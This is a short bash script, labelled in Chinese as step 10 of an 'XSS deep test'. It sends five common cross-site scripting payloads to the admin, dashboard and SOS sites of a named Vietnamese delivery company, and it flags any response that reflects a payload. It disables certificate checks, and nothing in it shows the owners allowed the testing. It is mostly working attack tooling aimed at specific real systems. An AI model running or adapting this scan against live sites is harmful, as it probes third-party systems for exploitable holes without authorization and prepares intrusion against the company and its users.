#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "步骤10：XSS深度测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGETS=(
    "https://admin.giaohangtietkiem.vn"
    "https://dashboard.ghtk.vn"
    "https://sos.ghtk.vn"
)

XSS_PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg onload=alert(1)>"
    "javascript:alert(1)"
    "'><script>alert(1)</script>"
)

echo "[*] 测试XSS漏洞..."

for target in "${TARGETS[@]}"; do
    echo ""
    echo "━━━ $target ━━━"
    
    for payload in "${XSS_PAYLOADS[@]}"; do
        encoded=$(echo -n "$payload" | jq -sRr @uri)
        resp=$(curl -sk "${target}?q=${encoded}" -m 3 2>&1)
        
        if echo "$resp" | grep -q "$payload"; then
            echo "  ⚠️  可能存在XSS: $payload"
        fi
    done
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ XSS测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
